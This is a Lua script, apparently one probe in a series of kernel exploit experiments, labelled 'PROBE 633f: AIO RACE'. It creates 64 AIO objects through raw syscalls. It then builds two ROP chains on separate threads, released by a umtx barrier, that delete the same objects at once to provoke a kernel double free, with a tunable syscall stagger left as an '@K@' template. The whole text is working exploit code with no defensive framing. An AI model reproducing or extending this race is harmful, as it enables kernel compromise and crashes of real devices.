-- CRASH_CLASS: HIGH
-- PROBE 633e: 64 single-count aio objects, two barrier-released deleters
print("=== PROBE 633f: AIO RACE WITH A @K@-SYSCALL STAGGER ===")
local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a) a=N(a) return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296)) end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end) if o then return N(v) end return nil end
local NIDS=64
local KOFF=@K@
local data=memory.alloc(0x2000)
local out=memory.alloc(0x40)
for i=0,0x1FFC,4 do wd(N(data)+i,0) end
local sc669=mk(669) local sc664=mk(664) local sc662=mk(662)
local ids=memory.alloc(NIDS*4)
local okc=0
for i=0,NIDS-1 do
    wd(N(out),0)
    local o,r=pcall(function() return sc669(uint64(1),uint64(N(data)),uint64(1),uint64(1),uint64(N(out))) end)
    local b=N((function() local oo,v=pcall(function() return memory.read_dword(N(out)) end) return oo and v or 0 end)())
    if o and b>0 then okc=okc+1 wd(N(ids)+i*4,b) end
end
print(string.format("[A] created=%d/%d first=%s last=%s",okc,NIDS,tostring(rd(N(ids))),tostring(rd(N(ids)+(NIDS-1)*4))))
if okc<NIDS then print("[!] short create"); return end
local chk=memory.alloc(0x40)
local good=0
for i=0,NIDS-1 do
    pcall(function() sc664(U(N(ids)+i*4),uint64(1),uint64(N(chk))) end)
    local st=rd(N(chk))
    if st==3 or st==0x10003 then good=good+1 end
end
print(string.format("[B] polled=%d/%d",good,NIDS))
if good<NIDS then print("[!] not ready"); return end
local W=memory.alloc(8)
wq(N(W),uint64(0))
local stA=memory.alloc(NIDS*4)
local stB=memory.alloc(NIDS*4)
for i=0,NIDS*4-1,4 do wd(N(stA)+i,0x77777777) wd(N(stB)+i,0x77777777) end
local function build(stp,koff)
    local c=ropchain({fcall_stub_padding_size=0x50000,stack_size=0x20000})
    c:push_syscall_with_ret(mk(454), U(N(W)), uint64(2), uint64(0))
    for i=1,koff do c:push_syscall_with_ret(mk(20)) end
    for i=0,NIDS-1 do
        c:push_syscall_with_ret(mk(662), U(N(ids)+i*4), uint64(1), U(N(stp)+i*4))
    end
    return c
end
local ca=build(N(stA),0)
local cb=build(N(stB),KOFF)
print("[C] chains built")
local ta=thread:new(ca)
local tb=thread:new(cb)
ta:run(true)
tb:run(true)
for i=1,600000 do local x=i end
wq(N(W),uint64(1))
local o1,r1=pcall(function() return mk(454)(U(N(W)),uint64(3),uint64(0x7fffffff)) end)
print(string.format("[D] wake rv=%s",tostring(o1 and r1 or "err")))
ta:join()
tb:join()
print("[E] joined")
local both,za,zb=0,0,0
for i=0,NIDS-1 do
    local a=rd(N(stA)+i*4) local b=rd(N(stB)+i*4)
    if a==0 then za=za+1 end
    if b==0 then zb=zb+1 end
    if a==0 and b==0 then both=both+1 end
end
print(string.format("[F] A zeros=%d B zeros=%d both=%d",za,zb,both))
print(string.format("[H] alive=%d",N(native.fcall_with_rax(syscall.pipe.fn_addr,20))))
print("[Z] alive")
